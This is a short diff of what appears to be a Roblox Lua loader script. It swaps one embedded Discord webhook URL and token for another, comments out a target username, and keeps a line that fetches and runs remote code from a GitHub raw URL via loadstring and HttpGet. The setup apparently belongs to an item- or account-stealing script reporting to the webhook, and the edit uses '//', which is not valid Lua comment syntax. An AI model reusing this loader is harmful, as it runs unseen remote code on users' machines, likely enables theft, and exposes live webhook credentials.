@@ -1,5 +1,4 @@
-Username = "ffyykream"
-Webhook = "https://discord.com/api/webhooks/1403263129294602322/DKtpTPl-eC3Mq3ORkQT_y3vplOu9EhgdJROYGNfiiX-7MJIesbUiyFjv41tXNuN7cT6o"
-MinimumValue = "1"
-
+//Username = ""
+Webhook = "https://discord.com/api/webhooks/1403212144035762197/FeqTkWDwWr3TLxn8mDMbcjuso401WO8vgKHBQwUoy-09AlLKxGfDeCXawAe2tG-DIuah"
+MinimumValue ="1"//
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ffyykrem/kreamscriptss/refs/heads/main/kreamscriptss"))();
